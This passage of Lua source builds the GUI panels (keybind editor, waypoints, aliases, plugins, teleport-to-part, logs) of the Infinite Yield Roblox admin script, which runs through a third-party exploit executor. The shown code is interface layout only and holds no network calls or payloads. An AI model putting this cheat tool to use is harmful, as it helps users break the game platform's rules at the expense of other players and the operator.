		Select_2.Position = UDim2.new(0, 160, 0, 0)
		Select_2.Size = UDim2.new(0, 40, 0, 20)
		Select_2.ZIndex = 10
		Select_2.Font = Enum.Font.SourceSans
		Select_2.Text = "Add"
		Select_2.TextColor3 = Color3.fromRGB(0, 0, 0)
		Select_2.TextSize = 14.000
		table.insert(shade3,Select_2)
		table.insert(text2,Select_2)
	
		Cmdbar_2.Name = "Cmdbar_2"
		Cmdbar_2.Parent = background_2
		Cmdbar_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Cmdbar_2.BorderSizePixel = 0
		Cmdbar_2.Position = UDim2.new(0, 150, 0, 35)
		Cmdbar_2.Size = UDim2.new(0, 150, 0, 20)
		Cmdbar_2.ZIndex = 10
		Cmdbar_2.Font = Enum.Font.SourceSans
		Cmdbar_2.PlaceholderText = "Command"
		Cmdbar_2.Text = ""
		Cmdbar_2.TextColor3 = Color3.fromRGB(255, 255, 255)
		Cmdbar_2.TextSize = 14.000
		Cmdbar_2.TextXAlignment = Enum.TextXAlignment.Left
	
		Cmdbar_3.Name = "Cmdbar_3"
		Cmdbar_3.Parent = background_2
		Cmdbar_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Cmdbar_3.BorderSizePixel = 0
		Cmdbar_3.Position = UDim2.new(0, 150, 0, 60)
		Cmdbar_3.Size = UDim2.new(0, 150, 0, 20)
		Cmdbar_3.ZIndex = 10
		Cmdbar_3.Font = Enum.Font.SourceSans
		Cmdbar_3.PlaceholderText = "Command 2"
		Cmdbar_3.Text = ""
		Cmdbar_3.TextColor3 = Color3.fromRGB(255, 255, 255)
		Cmdbar_3.TextSize = 14.000
		Cmdbar_3.TextXAlignment = Enum.TextXAlignment.Left
	
		CreateToggle.Name = "CreateToggle"
		CreateToggle.Parent = background_2
		CreateToggle.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		CreateToggle.BackgroundTransparency = 1
		CreateToggle.BorderSizePixel = 0
		CreateToggle.Position = UDim2.new(0, 152, 0, 10)
		CreateToggle.Size = UDim2.new(0, 198, 0, 20)
		CreateToggle.ZIndex = 10
		CreateToggle.Font = Enum.Font.SourceSans
		CreateToggle.Text = "Create Toggle"
		CreateToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
		CreateToggle.TextSize = 14.000
		CreateToggle.TextXAlignment = Enum.TextXAlignment.Left
		table.insert(text1,CreateToggle)
	
		Button_2.Name = "Button"
		Button_2.Parent = CreateToggle
		Button_2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
		Button_2.BorderSizePixel = 0
		Button_2.Position = UDim2.new(1, -20, 0, 0)
		Button_2.Size = UDim2.new(0, 20, 0, 20)
		Button_2.ZIndex = 10
		table.insert(shade3,Button_2)
	
		On_2.Name = "On"
		On_2.Parent = Button_2
		On_2.BackgroundColor3 = Color3.fromRGB(150, 150, 151)
		On_2.BackgroundTransparency = 1
		On_2.BorderSizePixel = 0
		On_2.Position = UDim2.new(0, 2, 0, 2)
		On_2.Size = UDim2.new(0, 16, 0, 16)
		On_2.ZIndex = 10
		On_2.Font = Enum.Font.SourceSans
		On_2.Text = ""
		On_2.TextColor3 = Color3.fromRGB(0, 0, 0)
		On_2.TextSize = 14.000
	
		shadow_2.Name = "shadow"
		shadow_2.Parent = KeybindEditor
		shadow_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		shadow_2.BorderSizePixel = 0
		shadow_2.Size = UDim2.new(0, 360, 0, 20)
		shadow_2.ZIndex = 10
		table.insert(shade2,shadow_2)
	
		PopupText_2.Name = "PopupText_2"
		PopupText_2.Parent = shadow_2
		PopupText_2.BackgroundTransparency = 1
		PopupText_2.Size = UDim2.new(1, 0, 0.949999988, 0)
		PopupText_2.ZIndex = 10
		PopupText_2.Font = Enum.Font.SourceSans
		PopupText_2.Text = "Set Keybinds"
		PopupText_2.TextColor3 = Color3.fromRGB(255, 255, 255)
		PopupText_2.TextSize = 14.000
		PopupText_2.TextWrapped = true
		table.insert(text1,PopupText_2)
	
		Exit_2.Name = "Exit_2"
		Exit_2.Parent = shadow_2
		Exit_2.BackgroundTransparency = 1
		Exit_2.Position = UDim2.new(1, -20, 0, 0)
		Exit_2.Size = UDim2.new(0, 20, 0, 20)
		Exit_2.ZIndex = 10
		Exit_2.Text = ""
	
		ExitImage_2.Parent = Exit_2
		ExitImage_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ExitImage_2.BackgroundTransparency = 1
		ExitImage_2.Position = UDim2.new(0, 5, 0, 5)
		ExitImage_2.Size = UDim2.new(0, 10, 0, 10)
		ExitImage_2.ZIndex = 10
		ExitImage_2.Image = getcustomasset("infiniteyield/assets/close.png")
	
		PositionsFrame.Name = "PositionsFrame"
		PositionsFrame.Parent = Settings
		PositionsFrame.Active = true
		PositionsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
		PositionsFrame.BorderSizePixel = 0
		PositionsFrame.Size = UDim2.new(0, 250, 0, 175)
		PositionsFrame.Position = UDim2.new(0, 0, 0, 175)
		PositionsFrame.ZIndex = 10
		table.insert(shade1,PositionsFrame)
	
		Close_3.Name = "Close"
		Close_3.Parent = PositionsFrame
		Close_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Close_3.BorderSizePixel = 0
		Close_3.Position = UDim2.new(0, 205, 0, 150)
		Close_3.Size = UDim2.new(0, 40, 0, 20)
		Close_3.Font = Enum.Font.SourceSans
		Close_3.TextSize = 14
		Close_3.Text = "Close"
		Close_3.TextColor3 = Color3.new(1, 1, 1)
		Close_3.ZIndex = 10
		table.insert(shade2,Close_3)
		table.insert(text1,Close_3)
	
		Delete_5.Name = "Delete"
		Delete_5.Parent = PositionsFrame
		Delete_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Delete_5.BorderSizePixel = 0
		Delete_5.Position = UDim2.new(0, 50, 0, 150)
		Delete_5.Size = UDim2.new(0, 40, 0, 20)
		Delete_5.Font = Enum.Font.SourceSans
		Delete_5.TextSize = 14
		Delete_5.Text = "Clear"
		Delete_5.TextColor3 = Color3.new(1, 1, 1)
		Delete_5.ZIndex = 10
		table.insert(shade2,Delete_5)
		table.insert(text1,Delete_5)
	
		Part.Name = "PartGoto"
		Part.Parent = PositionsFrame
		Part.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Part.BorderSizePixel = 0
		Part.Position = UDim2.new(0, 5, 0, 150)
		Part.Size = UDim2.new(0, 40, 0, 20)
		Part.Font = Enum.Font.SourceSans
		Part.TextSize = 14
		Part.Text = "Part"
		Part.TextColor3 = Color3.new(1, 1, 1)
		Part.ZIndex = 10
		table.insert(shade2,Part)
		table.insert(text1,Part)
	
		Holder_4.Name = "Holder"
		Holder_4.Parent = PositionsFrame
		Holder_4.BackgroundTransparency = 1
		Holder_4.BorderSizePixel = 0
		Holder_4.Position = UDim2.new(0, 0, 0, 0)
		Holder_4.Selectable = false
		Holder_4.Size = UDim2.new(0, 250, 0, 145)
		Holder_4.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
		Holder_4.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Holder_4.CanvasSize = UDim2.new(0, 0, 0, 0)
		Holder_4.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Holder_4.ScrollBarThickness = 0
		Holder_4.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Holder_4.VerticalScrollBarInset = 'Always'
		Holder_4.ZIndex = 10
	
		Example_4.Name = "Example"
		Example_4.Parent = PositionsFrame
		Example_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Example_4.BorderSizePixel = 0
		Example_4.Size = UDim2.new(0, 10, 0, 20)
		Example_4.Visible = false
		Example_4.Position = UDim2.new(0, 0, 0, -5)
		Example_4.ZIndex = 10
		table.insert(shade2,Example_4)
	
		Text_5.Name = "Text"
		Text_5.Parent = Example_4
		Text_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Text_5.BorderSizePixel = 0
		Text_5.Position = UDim2.new(0, 10, 0, 0)
		Text_5.Size = UDim2.new(0, 240, 0, 20)
		Text_5.Font = Enum.Font.SourceSans
		Text_5.TextSize = 14
		Text_5.Text = "Position"
		Text_5.TextColor3 = Color3.new(1, 1, 1)
		Text_5.TextXAlignment = Enum.TextXAlignment.Left
		Text_5.ZIndex = 10
		table.insert(shade2,Text_5)
		table.insert(text1,Text_5)
	
		Delete_6.Name = "Delete"
		Delete_6.Parent = Text_5
		Delete_6.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
		Delete_6.BorderSizePixel = 0
		Delete_6.Position = UDim2.new(0, 200, 0, 0)
		Delete_6.Size = UDim2.new(0, 40, 0, 20)
		Delete_6.Font = Enum.Font.SourceSans
		Delete_6.TextSize = 14
		Delete_6.Text = "Delete"
		Delete_6.TextColor3 = Color3.new(0, 0, 0)
		Delete_6.ZIndex = 10
		table.insert(shade3,Delete_6)
		table.insert(text2,Delete_6)
	
		TP.Name = "TP"
		TP.Parent = Text_5
		TP.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
		TP.BorderSizePixel = 0
		TP.Position = UDim2.new(0, 155, 0, 0)
		TP.Size = UDim2.new(0, 40, 0, 20)
		TP.Font = Enum.Font.SourceSans
		TP.TextSize = 14
		TP.Text = "Goto"
		TP.TextColor3 = Color3.new(0, 0, 0)
		TP.ZIndex = 10
		table.insert(shade3,TP)
		table.insert(text2,TP)
	
		AliasesFrame.Name = "AliasesFrame"
		AliasesFrame.Parent = Settings
		AliasesFrame.Active = true
		AliasesFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
		AliasesFrame.BorderSizePixel = 0
		AliasesFrame.Position = UDim2.new(0, 0, 0, 175)
		AliasesFrame.Size = UDim2.new(0, 250, 0, 175)
		AliasesFrame.ZIndex = 10
		table.insert(shade1,AliasesFrame)
	
		Close_2.Name = "Close"
		Close_2.Parent = AliasesFrame
		Close_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Close_2.BorderSizePixel = 0
		Close_2.Position = UDim2.new(0, 205, 0, 150)
		Close_2.Size = UDim2.new(0, 40, 0, 20)
		Close_2.Font = Enum.Font.SourceSans
		Close_2.TextSize = 14
		Close_2.Text = "Close"
		Close_2.TextColor3 = Color3.new(1, 1, 1)
		Close_2.ZIndex = 10
		table.insert(shade2,Close_2)
		table.insert(text1,Close_2)
	
		Delete_3.Name = "Delete"
		Delete_3.Parent = AliasesFrame
		Delete_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Delete_3.BorderSizePixel = 0
		Delete_3.Position = UDim2.new(0, 5, 0, 150)
		Delete_3.Size = UDim2.new(0, 40, 0, 20)
		Delete_3.Font = Enum.Font.SourceSans
		Delete_3.TextSize = 14
		Delete_3.Text = "Clear"
		Delete_3.TextColor3 = Color3.new(1, 1, 1)
		Delete_3.ZIndex = 10
		table.insert(shade2,Delete_3)
		table.insert(text1,Delete_3)
	
		Holder_3.Name = "Holder"
		Holder_3.Parent = AliasesFrame
		Holder_3.BackgroundTransparency = 1
		Holder_3.BorderSizePixel = 0
		Holder_3.Position = UDim2.new(0, 0, 0, 0)
		Holder_3.Size = UDim2.new(0, 250, 0, 145)
		Holder_3.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
		Holder_3.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Holder_3.CanvasSize = UDim2.new(0, 0, 0, 0)
		Holder_3.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Holder_3.ScrollBarThickness = 0
		Holder_3.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Holder_3.VerticalScrollBarInset = 'Always'
		Holder_3.ZIndex = 10
	
		Example_3.Name = "Example"
		Example_3.Parent = AliasesFrame
		Example_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Example_3.BorderSizePixel = 0
		Example_3.Size = UDim2.new(0, 10, 0, 20)
		Example_3.Visible = false
		Example_3.ZIndex = 10
		table.insert(shade2,Example_3)
	
		Text_4.Name = "Text"
		Text_4.Parent = Example_3
		Text_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Text_4.BorderSizePixel = 0
		Text_4.Position = UDim2.new(0, 10, 0, 0)
		Text_4.Size = UDim2.new(0, 240, 0, 20)
		Text_4.Font = Enum.Font.SourceSans
		Text_4.TextSize = 14
		Text_4.Text = "honk"
		Text_4.TextColor3 = Color3.new(1, 1, 1)
		Text_4.TextXAlignment = Enum.TextXAlignment.Left
		Text_4.ZIndex = 10
		table.insert(shade2,Text_4)
		table.insert(text1,Text_4)
	
		Delete_4.Name = "Delete"
		Delete_4.Parent = Text_4
		Delete_4.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
		Delete_4.BorderSizePixel = 0
		Delete_4.Position = UDim2.new(0, 200, 0, 0)
		Delete_4.Size = UDim2.new(0, 40, 0, 20)
		Delete_4.Font = Enum.Font.SourceSans
		Delete_4.TextSize = 14
		Delete_4.Text = "Delete"
		Delete_4.TextColor3 = Color3.new(0, 0, 0)
		Delete_4.ZIndex = 10
		table.insert(shade3,Delete_4)
		table.insert(text2,Delete_4)
	
		PluginsFrame.Name = "PluginsFrame"
		PluginsFrame.Parent = Settings
		PluginsFrame.Active = true
		PluginsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
		PluginsFrame.BorderSizePixel = 0
		PluginsFrame.Position = UDim2.new(0, 0, 0, 175)
		PluginsFrame.Size = UDim2.new(0, 250, 0, 175)
		PluginsFrame.ZIndex = 10
		table.insert(shade1,PluginsFrame)
	
		Close_4.Name = "Close"
		Close_4.Parent = PluginsFrame
		Close_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Close_4.BorderSizePixel = 0
		Close_4.Position = UDim2.new(0, 205, 0, 150)
		Close_4.Size = UDim2.new(0, 40, 0, 20)
		Close_4.Font = Enum.Font.SourceSans
		Close_4.TextSize = 14
		Close_4.Text = "Close"
		Close_4.TextColor3 = Color3.new(1, 1, 1)
		Close_4.ZIndex = 10
		table.insert(shade2,Close_4)
		table.insert(text1,Close_4)
	
		Add_3.Name = "Add"
		Add_3.Parent = PluginsFrame
		Add_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Add_3.BorderSizePixel = 0
		Add_3.Position = UDim2.new(0, 5, 0, 150)
		Add_3.Size = UDim2.new(0, 40, 0, 20)
		Add_3.Font = Enum.Font.SourceSans
		Add_3.TextSize = 14
		Add_3.Text = "Add"
		Add_3.TextColor3 = Color3.new(1, 1, 1)
		Add_3.ZIndex = 10
		table.insert(shade2,Add_3)
		table.insert(text1,Add_3)
	
		Holder_5.Name = "Holder"
		Holder_5.Parent = PluginsFrame
		Holder_5.BackgroundTransparency = 1
		Holder_5.BorderSizePixel = 0
		Holder_5.Position = UDim2.new(0, 0, 0, 0)
		Holder_5.Selectable = false
		Holder_5.Size = UDim2.new(0, 250, 0, 145)
		Holder_5.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
		Holder_5.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Holder_5.CanvasSize = UDim2.new(0, 0, 0, 0)
		Holder_5.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Holder_5.ScrollBarThickness = 0
		Holder_5.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		Holder_5.VerticalScrollBarInset = 'Always'
		Holder_5.ZIndex = 10
	
		Example_5.Name = "Example"
		Example_5.Parent = PluginsFrame
		Example_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Example_5.BorderSizePixel = 0
		Example_5.Size = UDim2.new(0, 10, 0, 20)
		Example_5.Visible = false
		Example_5.ZIndex = 10
		table.insert(shade2,Example_5)
	
		Text_6.Name = "Text"
		Text_6.Parent = Example_5
		Text_6.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Text_6.BorderSizePixel = 0
		Text_6.Position = UDim2.new(0, 10, 0, 0)
		Text_6.Size = UDim2.new(0, 240, 0, 20)
		Text_6.Font = Enum.Font.SourceSans
		Text_6.TextSize = 14
		Text_6.Text = "F4 > Toggle Fly"
		Text_6.TextColor3 = Color3.new(1, 1, 1)
		Text_6.TextXAlignment = Enum.TextXAlignment.Left
		Text_6.ZIndex = 10
		table.insert(shade2,Text_6)
		table.insert(text1,Text_6)
	
		Delete_7.Name = "Delete"
		Delete_7.Parent = Text_6
		Delete_7.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
		Delete_7.BorderSizePixel = 0
		Delete_7.Position = UDim2.new(0, 200, 0, 0)
		Delete_7.Size = UDim2.new(0, 40, 0, 20)
		Delete_7.Font = Enum.Font.SourceSans
		Delete_7.TextSize = 14
		Delete_7.Text = "Delete"
		Delete_7.TextColor3 = Color3.new(0, 0, 0)
		Delete_7.ZIndex = 10
		table.insert(shade3,Delete_7)
		table.insert(text2,Delete_7)
	
		PluginEditor.Name = randomString()
		PluginEditor.Parent = ScaledHolder
		PluginEditor.BorderSizePixel = 0
		PluginEditor.Active = true
		PluginEditor.BackgroundTransparency = 1
		PluginEditor.Position = UDim2.new(0.5, -180, 0, -500)
		PluginEditor.Size = UDim2.new(0, 360, 0, 20)
		PluginEditor.ZIndex = 10
	
		background_3.Name = "background"
		background_3.Parent = PluginEditor
		background_3.Active = true
		background_3.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
		background_3.BorderSizePixel = 0
		background_3.Position = UDim2.new(0, 0, 0, 20)
		background_3.Size = UDim2.new(0, 360, 0, 160)
		background_3.ZIndex = 10
		table.insert(shade1,background_3)
	
		Dark_2.Name = "Dark"
		Dark_2.Parent = background_3
		Dark_2.Active = true
		Dark_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		Dark_2.BorderSizePixel = 0
		Dark_2.Position = UDim2.new(0, 222, 0, 0)
		Dark_2.Size = UDim2.new(0, 2, 0, 160)
		Dark_2.ZIndex = 10
		table.insert(shade2,Dark_2)
	
		Img.Name = "Img"
		Img.Parent = background_3
		Img.BackgroundTransparency = 1
		Img.Position = UDim2.new(0, 242, 0, 3)
		Img.Size = UDim2.new(0, 100, 0, 95)
		Img.Image = getcustomasset("infiniteyield/assets/imgstudiopluginlogo.png")
		Img.ZIndex = 10
	
		AddPlugin.Name = "AddPlugin"
		AddPlugin.Parent = background_3
		AddPlugin.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		AddPlugin.BorderSizePixel = 0
		AddPlugin.Position = UDim2.new(0, 235, 0, 100)
		AddPlugin.Size = UDim2.new(0, 115, 0, 50)
		AddPlugin.Font = Enum.Font.SourceSans
		AddPlugin.TextSize = 14
		AddPlugin.Text = "Add Plugin"
		AddPlugin.TextColor3 = Color3.new(1, 1, 1)
		AddPlugin.ZIndex = 10
		table.insert(shade2,AddPlugin)
		table.insert(text1,AddPlugin)
	
		FileName.Name = "FileName"
		FileName.Parent = background_3
		FileName.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		FileName.BorderSizePixel = 0
		FileName.Position = UDim2.new(0.028, 0, 0.625, 0)
		FileName.Size = UDim2.new(0, 200, 0, 50)
		FileName.Font = Enum.Font.SourceSans
		FileName.TextSize = 14
		FileName.Text = "Plugin File Name"
		FileName.TextColor3 = Color3.new(1, 1, 1)
		FileName.ZIndex = 10
		table.insert(shade2,FileName)
		table.insert(text1,FileName)
	
		About.Name = "About"
		About.Parent = background_3
		About.BackgroundTransparency = 1
		About.BorderSizePixel = 0
		About.Position = UDim2.new(0, 17, 0, 10)
		About.Size = UDim2.new(0, 187, 0, 49)
		About.Font = Enum.Font.SourceSans
		About.TextSize = 14
		About.Text = "Plugins are .iy files and should be located in the 'workspace' folder of your exploit."
		About.TextColor3 = Color3.fromRGB(255, 255, 255)
		About.TextWrapped = true
		About.TextYAlignment = Enum.TextYAlignment.Top
		About.ZIndex = 10
		table.insert(text1,About)
	
		Directions_2.Name = "Directions"
		Directions_2.Parent = background_3
		Directions_2.BackgroundTransparency = 1
		Directions_2.BorderSizePixel = 0
		Directions_2.Position = UDim2.new(0, 17, 0, 60)
		Directions_2.Size = UDim2.new(0, 187, 0, 49)
		Directions_2.Font = Enum.Font.SourceSans
		Directions_2.TextSize = 14
		Directions_2.Text = "Type the name of the plugin file you want to add below."
		Directions_2.TextColor3 = Color3.fromRGB(255, 255, 255)
		Directions_2.TextWrapped = true
		Directions_2.TextYAlignment = Enum.TextYAlignment.Top
		Directions_2.ZIndex = 10
		table.insert(text1,Directions_2)
	
		shadow_3.Name = "shadow"
		shadow_3.Parent = PluginEditor
		shadow_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		shadow_3.BorderSizePixel = 0
		shadow_3.Size = UDim2.new(0, 360, 0, 20)
		shadow_3.ZIndex = 10
		table.insert(shade2,shadow_3)
	
		PopupText_3.Name = "PopupText"
		PopupText_3.Parent = shadow_3
		PopupText_3.BackgroundTransparency = 1
		PopupText_3.Size = UDim2.new(1, 0, 0.95, 0)
		PopupText_3.ZIndex = 10
		PopupText_3.Font = Enum.Font.SourceSans
		PopupText_3.TextSize = 14
		PopupText_3.Text = "Add Plugins"
		PopupText_3.TextColor3 = Color3.new(1, 1, 1)
		PopupText_3.TextWrapped = true
		table.insert(text1,PopupText_3)
	
		Exit_3.Name = "Exit"
		Exit_3.Parent = shadow_3
		Exit_3.BackgroundTransparency = 1
		Exit_3.Position = UDim2.new(1, -20, 0, 0)
		Exit_3.Size = UDim2.new(0, 20, 0, 20)
		Exit_3.Text = ""
		Exit_3.ZIndex = 10
	
		ExitImage_3.Parent = Exit_3
		ExitImage_3.BackgroundColor3 = Color3.new(1, 1, 1)
		ExitImage_3.BackgroundTransparency = 1
		ExitImage_3.Position = UDim2.new(0, 5, 0, 5)
		ExitImage_3.Size = UDim2.new(0, 10, 0, 10)
		ExitImage_3.Image = getcustomasset("infiniteyield/assets/close.png")
		ExitImage_3.ZIndex = 10
	
		AliasHint.Name = "AliasHint"
		AliasHint.Parent = AliasesFrame
		AliasHint.BackgroundTransparency = 1
		AliasHint.BorderSizePixel = 0
		AliasHint.Position = UDim2.new(0, 25, 0, 40)
		AliasHint.Size = UDim2.new(0, 200, 0, 50)
		AliasHint.Font = Enum.Font.SourceSansItalic
		AliasHint.TextSize = 16
		AliasHint.Text = "Add aliases by using the 'addalias' command"
		AliasHint.TextColor3 = Color3.new(1, 1, 1)
		AliasHint.TextStrokeColor3 = Color3.new(1, 1, 1)
		AliasHint.TextWrapped = true
		AliasHint.ZIndex = 10
		table.insert(text1,AliasHint)
	
		PluginsHint.Name = "PluginsHint"
		PluginsHint.Parent = PluginsFrame
		PluginsHint.BackgroundTransparency = 1
		PluginsHint.BorderSizePixel = 0
		PluginsHint.Position = UDim2.new(0, 25, 0, 40)
		PluginsHint.Size = UDim2.new(0, 200, 0, 50)
		PluginsHint.Font = Enum.Font.SourceSansItalic
		PluginsHint.TextSize = 16
		PluginsHint.Text = "Download plugins from the IY Discord (discord.gg/78ZuWSq)"
		PluginsHint.TextColor3 = Color3.new(1, 1, 1)
		PluginsHint.TextStrokeColor3 = Color3.new(1, 1, 1)
		PluginsHint.TextWrapped = true
		PluginsHint.ZIndex = 10
		table.insert(text1,PluginsHint)
	
		PositionsHint.Name = "PositionsHint"
		PositionsHint.Parent = PositionsFrame
		PositionsHint.BackgroundTransparency = 1
		PositionsHint.BorderSizePixel = 0
		PositionsHint.Position = UDim2.new(0, 25, 0, 40)
		PositionsHint.Size = UDim2.new(0, 200, 0, 70)
		PositionsHint.Font = Enum.Font.SourceSansItalic
		PositionsHint.TextSize = 16
		PositionsHint.Text = "Use the 'swp' or 'setwaypoint' command to add a position using your character (NOTE: Part teleports will not save)"
		PositionsHint.TextColor3 = Color3.new(1, 1, 1)
		PositionsHint.TextStrokeColor3 = Color3.new(1, 1, 1)
		PositionsHint.TextWrapped = true
		PositionsHint.ZIndex = 10
		table.insert(text1,PositionsHint)
	
		ToPartFrame.Name = randomString()
		ToPartFrame.Parent = ScaledHolder
		ToPartFrame.Active = true
		ToPartFrame.BackgroundTransparency = 1
		ToPartFrame.Position = UDim2.new(0.5, -180, 0, -500)
		ToPartFrame.Size = UDim2.new(0, 360, 0, 20)
		ToPartFrame.ZIndex = 10
	
		background_4.Name = "background"
		background_4.Parent = ToPartFrame
		background_4.Active = true
		background_4.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
		background_4.BorderSizePixel = 0
		background_4.Position = UDim2.new(0, 0, 0, 20)
		background_4.Size = UDim2.new(0, 360, 0, 117)
		background_4.ZIndex = 10
		table.insert(shade1,background_4)
	
		ChoosePart.Name = "ChoosePart"
		ChoosePart.Parent = background_4
		ChoosePart.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		ChoosePart.BorderSizePixel = 0
		ChoosePart.Position = UDim2.new(0, 100, 0, 55)
		ChoosePart.Size = UDim2.new(0, 75, 0, 30)
		ChoosePart.Font = Enum.Font.SourceSans
		ChoosePart.TextSize = 14
		ChoosePart.Text = "Select Part"
		ChoosePart.TextColor3 = Color3.new(1, 1, 1)
		ChoosePart.ZIndex = 10
		table.insert(shade2,ChoosePart)
		table.insert(text1,ChoosePart)
	
		CopyPath.Name = "CopyPath"
		CopyPath.Parent = background_4
		CopyPath.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		CopyPath.BorderSizePixel = 0
		CopyPath.Position = UDim2.new(0, 185, 0, 55)
		CopyPath.Size = UDim2.new(0, 75, 0, 30)
		CopyPath.Font = Enum.Font.SourceSans
		CopyPath.TextSize = 14
		CopyPath.Text = "Copy Path"
		CopyPath.TextColor3 = Color3.new(1, 1, 1)
		CopyPath.ZIndex = 10
		table.insert(shade2,CopyPath)
		table.insert(text1,CopyPath)
	
		Directions_3.Name = "Directions"
		Directions_3.Parent = background_4
		Directions_3.BackgroundTransparency = 1
		Directions_3.BorderSizePixel = 0
		Directions_3.Position = UDim2.new(0, 51, 0, 17)
		Directions_3.Size = UDim2.new(0, 257, 0, 32)
		Directions_3.Font = Enum.Font.SourceSans
		Directions_3.TextSize = 14
		Directions_3.Text = 'Click on a part and then click the "Select Part" button below to set it as a teleport location'
		Directions_3.TextColor3 = Color3.new(1, 1, 1)
		Directions_3.TextWrapped = true
		Directions_3.TextYAlignment = Enum.TextYAlignment.Top
		Directions_3.ZIndex = 10
		table.insert(text1,Directions_3)
	
		Path.Name = "Path"
		Path.Parent = background_4
		Path.BackgroundTransparency = 1
		Path.BorderSizePixel = 0
		Path.Position = UDim2.new(0, 0, 0, 94)
		Path.Size = UDim2.new(0, 360, 0, 16)
		Path.Font = Enum.Font.SourceSansItalic
		Path.TextSize = 14
		Path.Text = ""
		Path.TextColor3 = Color3.new(1, 1, 1)
		Path.TextScaled = true
		Path.TextWrapped = true
		Path.TextYAlignment = Enum.TextYAlignment.Top
		Path.ZIndex = 10
		table.insert(text1,Path)
	
		shadow_4.Name = "shadow"
		shadow_4.Parent = ToPartFrame
		shadow_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		shadow_4.BorderSizePixel = 0
		shadow_4.Size = UDim2.new(0, 360, 0, 20)
		shadow_4.ZIndex = 10
		table.insert(shade2,shadow_4)
	
		PopupText_5.Name = "PopupText"
		PopupText_5.Parent = shadow_4
		PopupText_5.BackgroundTransparency = 1
		PopupText_5.Size = UDim2.new(1, 0, 0.95, 0)
		PopupText_5.ZIndex = 10
		PopupText_5.Font = Enum.Font.SourceSans
		PopupText_5.TextSize = 14
		PopupText_5.Text = "Teleport to Part"
		PopupText_5.TextColor3 = Color3.new(1, 1, 1)
		PopupText_5.TextWrapped = true
		table.insert(text1,PopupText_5)
	
		Exit_4.Name = "Exit"
		Exit_4.Parent = shadow_4
		Exit_4.BackgroundTransparency = 1
		Exit_4.Position = UDim2.new(1, -20, 0, 0)
		Exit_4.Size = UDim2.new(0, 20, 0, 20)
		Exit_4.Text = ""
		Exit_4.ZIndex = 10
	
		ExitImage_5.Parent = Exit_4
		ExitImage_5.BackgroundColor3 = Color3.new(1, 1, 1)
		ExitImage_5.BackgroundTransparency = 1
		ExitImage_5.Position = UDim2.new(0, 5, 0, 5)
		ExitImage_5.Size = UDim2.new(0, 10, 0, 10)
		ExitImage_5.Image = getcustomasset("infiniteyield/assets/close.png")
		ExitImage_5.ZIndex = 10
	
		logs.Name = randomString()
		logs.Parent = ScaledHolder
		logs.Active = true
		logs.BackgroundTransparency = 1
		logs.Position = UDim2.new(0, 0, 1, 10)
		logs.Size = UDim2.new(0, 338, 0, 20)
		logs.ZIndex = 10
	
		shadow.Name = "shadow"
		shadow.Parent = logs
		shadow.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
		shadow.BorderSizePixel = 0
		shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
		shadow.Size = UDim2.new(0, 338, 0, 20)
		shadow.ZIndex = 10
		table.insert(shade2,shadow)
	
		Hide.Name = "Hide"
		Hide.Parent = shadow
		Hide.BackgroundTransparency = 1
		Hide.Position = UDim2.new(1, -40, 0, 0)
		Hide.Size = UDim2.new(0, 20, 0, 20)
		Hide.ZIndex = 10
		Hide.Text = ""
	
		ImageLabel.Parent = Hide
		ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
		ImageLabel.BackgroundTransparency = 1
		ImageLabel.Position = UDim2.new(0, 3, 0, 3)
		ImageLabel.Size = UDim2.new(0, 14, 0, 14)
		ImageLabel.Image = getcustomasset("infiniteyield/assets/minimize.png")
		ImageLabel.ZIndex = 10
	
		PopupText.Name = "PopupText"
		PopupText.Parent = shadow
		PopupText.BackgroundTransparency = 1
		PopupText.Size = UDim2.new(1, 0, 0.949999988, 0)
		PopupText.ZIndex = 10
		PopupText.Font = Enum.Font.SourceSans
